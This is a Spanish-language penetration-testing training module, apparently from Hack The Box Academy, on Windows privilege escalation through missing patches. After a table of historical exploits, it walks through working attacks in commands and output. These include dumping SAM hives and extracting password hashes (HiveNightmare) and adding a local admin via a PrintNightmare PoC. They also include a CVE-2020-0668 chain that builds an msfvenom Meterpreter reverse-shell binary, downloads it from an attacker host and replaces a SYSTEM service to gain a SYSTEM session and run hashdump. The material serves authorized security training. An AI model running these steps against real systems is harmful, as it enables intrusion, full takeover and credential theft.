Es un gran desafío asegurar que todos los escritorios de los usuarios y servidores estén actualizados, y el cumplimiento del 100% para todas las computadoras con parches de seguridad probablemente no sea un objetivo alcanzable. Suponiendo que una computadora ha sido seleccionada para la instalación de actualizaciones, por ejemplo, usando SCCM (Microsoft System Center Configuration Manager) o WSUS (Windows Server Update Services), hay muchas razones por las que podrían fallar en la instalación. A lo largo de los años, ha habido muchos **kernel exploits** que afectan al sistema operativo **Windows** desde **Windows 2000/XP** hasta **Windows 10/Server 2016/2019**. A continuación, se presenta una tabla detallada de los **remote code execution/local privilege escalation exploits** conocidos para sistemas operativos **Windows**, desglosados por nivel de **service pack**, desde **Windows XP** hasta **Server 2016**.

|Base OS|XP|XP|XP|XP|2003|2003|2003|Vista|Vista|Vista|2008|2008|7|7|2008R2|2008R2|8|8.1|2012|2012R2|10|2016|
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
|Service Pack|SP0|SP1|SP2|SP3|SP0|SP1|SP2|SP0|SP1|SP2|SP0|SP2|SP0|SP1|SP0|SP1|SP0|SP1|||||||
|MS03-026|•|•|•|•|•|•|•||||||||||||||||
|MS05-039|•|•|•||•|•|||||||||||||||||
|MS08-025|•|•|•||•|•|•|•|•||•||||||||||||
|MS08-067|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS08-068|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-012|•|•|•|•|•|•|•|•|•||•||||||||||||
|MS09-050||||||||•|•|•|•|•|||||||||||
|MS10-015|||•|•|•|•|•|•|•|•|||||||||||||
|MS10-059||||||||•|•|•|•|•|•||•||||||||
|MS10-092||||||||•|•|•|•|•|•||•||||||||
|MS11-011||||•|•|•|•|•|•|•|•|•|•||•||||||||
|MS11-046||||•|•|•|•|•|•|•|•|•|•|•|•|•|||||||
|MS11-062||||•|•|•|•||||||||||||||||
|MS11-080||||•|•|•|•||||||||||||||||
|MS13-005||||||||•|•|•|•|•|•|•|•|•|•||•||||
|MS13-053||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS13-081|||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•||•||||
|MS14-002||||•|•|•|•||||||||||||||||
|MS14-040|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-058|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|
|MS14-062|||||•|•|•||||||||||||||||
|MS14-068|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS14-070|||||•|•|•||||||||||||||||
|MS15-001|||||||||||||•|•|•|•|•|•|•|•|||
|MS15-010|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-051|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-061|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-076|||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-078||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|||
|MS15-097||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•||
|MS16-016||||||||•|•|•|•|•|•|•|•|•|||||||
|MS16-032||||||||•|•|•|•|•|•|•|•|•||•|•|•|||
|MS16-135||||||||•|•|•|•|•|•|•|•|•||•|•|•|•|•|
|MS17-010||||||||•|•|•|•|•|•|•|•|•|•|•|•|•|•|•|
|CVE-2017-0213: COM Aggregate Marshaler|||||||||||||•|•|•|•|•|•|•|•|•|•|
|Hot Potato|||||||||||||•|•|•|•|•|•|•|•|•||
|SmashedPotato|||||||||||||•|•|•|•|•|•|•|•|•||

### Note:

Esta tabla no está 100% completa y no abarca más allá de 2017. Hasta la fecha, existen más vulnerabilidades conocidas para las versiones más recientes del sistema operativo e incluso **Server 2019**.

Este [sitio](https://msrc.microsoft.com/update-guide/vulnerability) es útil para buscar información detallada sobre las vulnerabilidades de seguridad de **Microsoft**. Esta base de datos tiene 4,733 vulnerabilidades de seguridad ingresadas al momento de escribir, mostrando la gran superficie de ataque que presenta un entorno **Windows**.

Como podemos ver en esta tabla, hay muchos **exploits** que funcionan para **Windows XP** hasta **Server 2012R2**. A medida que llegamos a **Windows 10** y **Server 2016**, hay menos **exploits** conocidos. Esto se debe en parte a los cambios en el sistema operativo a lo largo del tiempo, incluidas las mejoras de seguridad y la depreciación de versiones anteriores de protocolos como **SMB**. Una cosa importante a notar de esta tabla es que cuando se descubren nuevas vulnerabilidades o se lanzan **exploits** (como **MS17-010**), estos suelen afectar versiones anteriores del sistema operativo. Por eso es vital mantenerse al día con los parches o actualizar, retirar o segregar los sistemas **Windows** que han llegado al final de su vida útil. Exploraremos esto en mayor profundidad más adelante en este módulo.

Es importante notar que, aunque algunos de los ejemplos anteriores son vulnerabilidades de **remote code execution**, también podemos usarlos fácilmente para escalar privilegios. Un ejemplo es si obtenemos acceso a un sistema y notamos que un puerto como el 445 (servicio **SMB**) no es accesible desde el exterior, podemos escalar privilegios si es vulnerable a algo como **EternalBlue (MS17-010)**. En este caso, podríamos reenviar el puerto en cuestión para que sea accesible desde nuestro host de ataque o ejecutar el **exploit** en cuestión localmente para escalar privilegios.

---

## Notable Vulnerabilities

A lo largo de los años, ha habido muchas vulnerabilidades de **Windows** de alto impacto que pueden ser aprovechadas para escalar privilegios, algunas son vectores puramente de escalamiento de privilegios locales y otras son fallos de **remote code execution (RCE)** que pueden ser utilizados para escalar privilegios al reenviar un puerto local. Un ejemplo de lo último sería aterrizar en una caja que no permite el acceso al puerto 445 desde el exterior, realizar el reenvío de puertos para acceder a este puerto desde nuestra caja de ataque y aprovechar una falla de **remote code execution** contra el servicio **SMB** para escalar privilegios. A continuación, se presentan algunas vulnerabilidades de **Windows** de extremadamente alto impacto a lo largo de los años que pueden ser aprovechadas para escalar privilegios.

`MS08-067` - Esta fue una vulnerabilidad de **remote code execution** en el servicio "Server" debido al manejo inadecuado de solicitudes **RPC**. Esto afectó a **Windows Server 2000, 2003, y 2008** y **Windows XP** y **Vista** y permite a un atacante no autenticado ejecutar código arbitrario con privilegios de **SYSTEM**. Aunque típicamente se encuentra en entornos de clientes como una vulnerabilidad de **remote code execution**, podemos aterrizar en un host donde el servicio **SMB** esté bloqueado a través del **firewall**. Podemos usar esto para escalar privilegios después de reenviar el puerto 445 de regreso a nuestra caja de ataque. Aunque esta es una vulnerabilidad "legacy", todavía la veo aparecer de vez en cuando en grandes organizaciones, especialmente en aquellas de la industria médica que pueden estar ejecutando aplicaciones específicas que solo funcionan en versiones anteriores de **Windows Server/Desktop**. No debemos descartar las vulnerabilidades antiguas incluso en 2021. Nos encontraremos con cada escenario bajo el sol mientras realizamos evaluaciones de clientes y debemos estar preparados para contar con todas las posibilidades. La caja [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) en la plataforma **Hack The Box** muestra esta vulnerabilidad desde el punto de vista de la **remote code execution**. Hay versiones independientes así como una versión de **Metasploit** de este **exploit**.

`MS17-010` - También conocido como [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) es una vulnerabilidad de **remote code execution** que fue parte del kit de herramientas **FuzzBunch** lanzado en la filtración de **[Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers)**. Este **exploit** aprovecha una vulnerabilidad en el protocolo **SMB** porque el protocolo **SMBv1** maneja mal los paquetes especialmente diseñados por un atacante, lo que lleva a la ejecución de código arbitrario en el host de destino como la cuenta **SYSTEM**. Al igual que **MS08-067**, esta vulnerabilidad también puede ser aprovechada como un vector de escalamiento de privilegios locales si aterrizamos en un host donde el puerto 445 esté bloqueado por un **firewall**. Hay varias versiones de este **exploit** para el **Metasploit Framework** así como **scripts** de **exploit** independientes. Este ataque se mostró en la caja [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) en **Hack The Box**, nuevamente desde el punto de vista remoto.

`ALPC Task Scheduler 0-Day` - El método de punto final **ALPC** utilizado por el servicio **Windows Task Scheduler** podría ser utilizado para escribir **DACLs** arbitrarios en archivos `.job` ubicados en el directorio `C:\Windows\tasks`. Un atacante podría aprovechar esto para crear un enlace duro a un archivo que controle el atacante. El **exploit** para esta falla utilizó la función **API [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN)** para llamar a un trabajo de impresión utilizando la impresora **XPS** y secuestrar la **DLL** como **NT AUTHORITY\SYSTEM** a través del servicio de **Spooler**. Hay una escritura en profundidad disponible [aquí](https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). La caja **Hack The Box** [Hackback](https://snowscan.io/htb-writeup-hackback/) puede ser utilizada para probar este **exploit** de escalamiento de privilegios.

El verano de 2021 reveló un tesoro de nuevas fallas de **remote code execution** y escalamiento de privilegios locales relacionadas con **Windows** y **Active Directory** para el deleite de los **penetration testers** (y atacantes del mundo real), y estoy seguro de los gemidos de nuestros colegas trabajadores en el lado de la defensa.

`CVE-2021-36934 HiveNightmare, aka SeriousSam` es una falla en **Windows 10** que resulta en que cualquier usuario tenga derechos para leer el **Windows registry** y acceder a información sensible independientemente del nivel de privilegios. Los investigadores desarrollaron rápidamente un **exploit** de **PoC** para permitir la lectura de las colmenas del registro **SAM, SYSTEM**, y **SECURITY** y crear copias de ellas para procesarlas fuera de línea más tarde y extraer **password hashes** (incluyendo el **local admin**) utilizando una herramienta como **SecretsDump.py**. Más información sobre esta falla se puede encontrar [aquí](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) y [este](https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe) **exploit binary** puede ser utilizado para crear copias de los tres archivos en nuestro directorio de trabajo. Este [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) puede ser utilizado para detectar la falla y también corregir el problema de **ACL**. Vamos a echar un vistazo.

### Checking Permissions on the SAM File

Podemos verificar esta vulnerabilidad utilizando `icacls` para verificar los permisos en el archivo **SAM**. En nuestro caso, tenemos una versión vulnerable ya que el archivo es legible por el grupo `BUILTIN\Users`.

```r
C:\htb> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

La explotación exitosa también requiere la presencia de una o más copias de sombra. La mayoría de los sistemas **Windows 10** tendrán **System Protection** habilitado por defecto, lo que creará copias de seguridad periódicas, incluyendo la copia de sombra necesaria para aprovechar esta falla.

### Performing Attack and Parsing Password Hashes

Este [PoC](https://github.com/GossiTheDog/HiveNightmare) puede ser utilizado para realizar el ataque, creando copias de las colmenas del registro mencionadas anteriormente:

```r
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY

Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07


Assuming no errors above, you should be able to find hive dump files in current working directory.
```

Estas copias luego pueden ser transferidas de vuelta al host de ataque, donde se utiliza **impacket-secretsdump** para extraer los **hashes**:

```r
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Target system bootKey: 0xebb2121de07ed08fc7dc58aa773b23d6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c93428723187f868ae2f99d4fa66dceb:::
mrb3n:1001:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
htb-student:1002:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x3c7b7e66890fb2181a74bb56ab12195f248e9461
dpapi_userkey:0xc3e6491e75d7cffe8efd40df94d83cba51832a56
[*] NL$KM 
 0000   45 C5 B2 32 29 8B 05 B8  E7 E7 E0 4B 2C 14 83 02   E..2)......K,...
 0010   CE 2F E7 D9 B8 E0 F0 F8  20 C8 E4 70 DD D1 7F 4F   ./...... ..p...O
 0020   42 2C E6 9E AF 57 74 01  09 88 B3 78 17 3F 88 54   B,...Wt....x.?.T
 0030   52 8F 8D 9C 06 36 C0 24  43 B9 D8 0F 35 88 B9 60   R....6.$C...5..`
NL$KM:45c5b232298b05b8e7e7e04b2c148302ce2fe7d9b8e0f0f820c8e470ddd17f4f422ce69eaf5774010988b378173f8854528f8d9c0636c02443b9d80f3588b960
```

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` es una falla en [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) que se utiliza para permitir la impresión remota y la instalación de controladores. Esta función está destinada a dar a los usuarios con el privilegio **Windows SeLoadDriverPrivilege** la capacidad de agregar controladores a un **Print Spooler** remoto. Este derecho está típicamente reservado para los usuarios en el grupo de **Administrators** integrado y **Print Operators** que pueden tener una necesidad legítima de instalar un controlador de impresora en la máquina de un usuario final de forma remota. La falla permitió que cualquier usuario autenticado agregara un controlador de impresora a un sistema **Windows** sin tener el privilegio mencionado anteriormente, lo que permite a un atacante ejecutar código remoto completo como **SYSTEM** en cualquier sistema afectado. La falla afecta a todas las versiones soportadas de **Windows**, y dado que el **Print Spooler** se ejecuta por defecto en **Domain Controllers**, **Windows 7** y **10**, y a menudo está habilitado en servidores **Windows**, esto presenta una superficie de ataque masiva, de ahí "nightmare". **Microsoft** inicialmente lanzó un parche que no solucionó el problema (y la guía inicial era deshabilitar el servicio **Spooler**, lo cual no es práctico para muchas organizaciones) pero lanzó un segundo [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) en julio de 2021 junto con la guía para verificar que ciertas configuraciones del registro estén establecidas en **0** o no definidas. Una vez que esta vulnerabilidad se hizo pública, se lanzaron rápidamente **PoC exploits**. [Esta](https://github.com/cube0x0/CVE-2021-1675) versión de **[@cube0x0](https://twitter.com/cube0x0)** puede ser utilizada para ejecutar una **DLL** maliciosa de forma remota o local utilizando una versión modificada de **Impacket**. El repositorio también contiene una implementación en **C#**. Esta [implementación en PowerShell](https://github.com/calebstewart/CVE-2021-1675) puede ser utilizada para una rápida escalación de privilegios locales. Por defecto, este script agrega un nuevo usuario administrador local, pero también podemos proporcionar una **DLL** personalizada para obtener un **reverse shell** o similar si agregar un usuario administrador local no está dentro del alcance.

### Checking for Spooler Service

Podemos verificar rápidamente si el servicio **Spooler** está en ejecución con el siguiente comando. Si no está en ejecución, recibiremos un error de "path does not exist".

```r
PS C:\htb> ls \\localhost\pipe\spoolss


    Directory: \\localhost\pipe


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
                                                  spoolss
```

### Adding Local Admin with PrintNightmare PowerShell PoC

Primero comienza [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) la política de ejecución en el host de destino:

```r
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

Ahora podemos importar el script de **PowerShell** y usarlo para agregar un nuevo usuario administrador local.

```r
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\htb-student\AppData\Local\Temp\nightmare.dll
```

### Confirming New Admin User

Si todo salió según lo planeado, tendremos un nuevo usuario administrador local bajo nuestro control. Agregar un usuario es "ruidoso", No querríamos hacer esto en una evaluación donde la discreción sea una consideración. Además, querríamos verificar con nuestro cliente para asegurarnos de que la creación de cuentas esté dentro del alcance de la evaluación.

```r
PS C:\htb> net user hacker

User name                    hacker
Full Name                    hacker
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            ?8/?9/?2021 12:12:01 PM
Password expires             Never
Password changeable          ?8/?9/?2021 12:12:01 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

Este es un pequeño muestreo de algunas de las vulnerabilidades de mayor impacto. Si bien es imperativo para nosotros entender y ser capaces de enumerar y explotar estas vulnerabilidades, también es importante poder detectar y aprovechar fallas menos conocidas.

---

## Enumerating Missing Patches

El primer paso es observar las actualizaciones instaladas e intentar encontrar actualizaciones que puedan haber sido omitidas, abriendo así un camino de ataque para nosotros.

### Examining Installed Updates

Podemos examinar las actualizaciones instaladas de varias maneras. A continuación, se muestran tres comandos separados que podemos usar.

```r
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

### Viewing Installed Updates with WMI

```r
C:\htb> wmic qfe list brief

Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
Update                        KB4601056               NT AUTHORITY\SYSTEM  3/27/2021                                    
Update                        KB4513661                                    1/9/2020                                     
Security Update               KB4516115                                    1/9/2020                                     
Update                        KB4517245                                    1/9/2020                                     
Security Update               KB4528759                                    1/9/2020                                     
Security Update               KB4535680               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB4580325               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000908               NT AUTHORITY\SYSTEM  3/27/2021                                    
Security Update               KB5000808               NT AUTHORITY\SYSTEM  3/27/2021                                    
```

Podemos buscar cada **KB (Microsoft Knowledge Base ID number)** en el [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) para tener una mejor idea de qué correcciones se han instalado y cuánto atraso puede tener el sistema en actualizaciones de seguridad. Una búsqueda de `KB5000808` nos muestra que esta es una actualización de marzo de 2021, lo que significa que el sistema probablemente esté muy atrasado en actualizaciones de seguridad.

---

## CVE-2020-0668 Example

A continuación, vamos a explotar [Microsoft CVE-2020-0668: Windows Kernel Elevation of Privilege Vulnerability](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/), que explota una vulnerabilidad de movimiento de archivos arbitrarios aprovechando el **Windows Service Tracing**. **Service Tracing** permite a los usuarios solucionar problemas con servicios y módulos en ejecución generando información de depuración. Sus parámetros son configurables utilizando el registro de **Windows**. Establecer un valor **MaxFileSize** personalizado que sea más pequeño que el tamaño del archivo solicita que el archivo sea renombrado con una extensión `.OLD` cuando se activa el servicio. Esta operación de movimiento es realizada por **NT AUTHORITY\SYSTEM**, y puede ser abusada para mover un archivo de nuestra elección con la ayuda de puntos de montaje y enlaces simbólicos.

### Checking Current User Privileges

Vamos a verificar los privilegios del usuario actual.

```r
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### After Building Solution

Podemos usar [este](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) **exploit** para **CVE-2020-0668**, descargarlo y abrirlo en **Visual Studio** dentro de una **VM**. La construcción de la solución debería crear los siguientes archivos.

```r
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

En este punto, podemos utilizar el **exploit** para crear un archivo de nuestra elección en una carpeta protegida como **C:\Windows\System32**. No podemos sobrescribir ningún archivo protegido de **Windows**. Esta escritura de archivo privilegiada necesita ser encadenada con otra vulnerabilidad, como **[UsoDllLoader](https://github.com/itm4n/UsoDllLoader)** o **[DiagHub](https://github.com/xct/diaghub)** para cargar la **DLL** y escalar nuestros privilegios. Sin embargo, la técnica de **UsoDllLoader** puede no funcionar si las actualizaciones de **Windows** están pendientes o actualmente se están instalando, y el servicio **DiagHub** puede no estar disponible.

También podemos buscar cualquier software de terceros, que pueda ser aprovechado, como el **Mozilla Maintenance Service**. Este servicio se ejecuta en el contexto de **SYSTEM** y puede ser iniciado por usuarios no privilegiados. El binario

 (no protegido por el sistema) de este servicio se encuentra a continuación.

- `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

### Checking Permissions on Binary

`icacls` confirma que solo tenemos permisos de lectura y ejecución en este binario basado en la línea `BUILTIN\Users:(I)(RX)` en la salida del comando.

```r
C:\htb> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                          BUILTIN\Administrators:(I)(F)
                                                                          BUILTIN\Users:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                          APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
Successfully processed 1 files; Failed processing 0 files
```

### Generating Malicious Binary

Vamos a generar un binario **maintenanceservice.exe** malicioso que puede ser utilizado para obtener una conexión de **Meterpreter reverse shell** desde nuestro objetivo.

```r
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 645 bytes
Final size of exe file: 7168 bytes
```

### Hosting the Malicious Binary

Podemos descargarlo al objetivo utilizando **cURL** después de iniciar un servidor **HTTP Python** en nuestro host de ataque como en la sección de **User Account Control** anteriormente. También podemos usar **wget** desde el objetivo.

```r
$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.43.13 - - [01/Mar/2022 18:17:26] "GET /maintenanceservice.exe HTTP/1.1" 200 -
10.129.43.13 - - [01/Mar/2022 18:17:45] "GET /maintenanceservice.exe HTTP/1.1" 200 -
```

### Downloading the Malicious Binary

Para este paso necesitamos hacer dos copias del archivo **.exe** malicioso. Podemos simplemente pasarlo dos veces o hacerlo una vez y hacer una segunda copia.

Necesitamos hacer esto porque ejecutar el **exploit** corrompe la versión maliciosa de **maintenanceservice.exe** que se mueve a (nuestra copia en `c:\Users\htb-student\Desktop` que estamos apuntando) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` que necesitaremos tener en cuenta más tarde. Si intentamos utilizar la versión copiada, recibiremos un **system error 216** porque el archivo **.exe** ya no es un binario válido.

```r
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

### Running the Exploit

A continuación, ejecutemos el **exploit**. Acepta dos argumentos, los archivos de origen y destino.

```r
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"                                       

[+] Moving C:\Users\htb-student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Mounting \RPC Control onto C:\Users\htb-student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\htb-student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```

### Checking Permissions of New File

El **exploit** se ejecuta y ejecutar `icacls` nuevamente muestra la siguiente entrada para nuestro usuario: `WINLPE-WS02\htb-student:(F)`. Esto significa que nuestro usuario **htb-student** tiene control total sobre el binario **maintenanceservice.exe**, y podemos sobrescribirlo con una versión no corrupta de nuestro binario malicioso.

```r
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe NT AUTHORITY\SYSTEM:(F)
                                                                          BUILTIN\Administrators:(F)
                                                                          WINLPE-WS02\htb-student:(F)
```

### Replacing File with Malicious Binary

Podemos sobrescribir el binario **maintenanceservice.exe** en `c:\Program Files (x86)\Mozilla Maintenance Service` con una buena copia de trabajo de nuestro binario malicioso creado anteriormente antes de proceder a iniciar el servicio. En este ejemplo, descargamos dos copias del binario malicioso en `C:\Users\htb-student\Desktop`, **maintenanceservice.exe** y **maintenanceservice2.exe**. Vamos a mover la buena copia que no fue corrompida por el **exploit** **maintenanceservice2.exe** al directorio de **Program Files**, asegurándonos de renombrar el archivo correctamente y eliminar el **2** o el servicio no se iniciará. El comando **copy** solo funcionará desde una ventana de **cmd.exe**, no desde una consola de **PowerShell**.

```r
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

        1 file(s) copied.

```

### Metasploit Resource Script

A continuación, guarda los comandos a continuación en un archivo **Resource Script** nombrado **handler.rc**.

```r
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

### Launching Metasploit with Resource Script

Lanza **Metasploit** usando el archivo **Resource Script** para precargar nuestras configuraciones.

```r
sudo msfconsole -r handler.rc 
                                                 

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v6.0.9-dev                           ]
+ -- --=[ 2069 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Use the resource command to run commands from a file

[*] Processing handler.rc for ERB directives.
resource (handler.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
resource (handler.rc)> set LHOST 10.10.14.3
LHOST => 10.10.14.3
resource (handler.rc)> set LPORT 8443
LPORT => 8443
resource (handler.rc)> exploit
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
```

### Starting the Service

Inicia el servicio, y deberíamos obtener una sesión como **NT AUTHORITY\SYSTEM**.

```r
C:\htb> net start MozillaMaintenance 

The service is not responding to the control function

More help is available by typing NET HELPMSG 2186
```

### Receiving a Meterpreter Session

Recibiremos un error al intentar iniciar el servicio, pero aún recibiremos una llamada de vuelta una vez que el binario de **Meterpreter** se ejecute.

```r
[*] Started HTTPS reverse handler on https://10.10.14.3:8443
[*] https://10.10.14.3:8443 handling request from 10.129.43.13; (UUID: syyuxztc) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (10.10.14.3:8443 -> 10.129.43.13:52047) at 2021-05-14 13:38:55 -0400


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-WS02
OS              : Windows 10 (10.0 Build 18363).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 6
Meterpreter     : x64/windows


meterpreter > hashdump

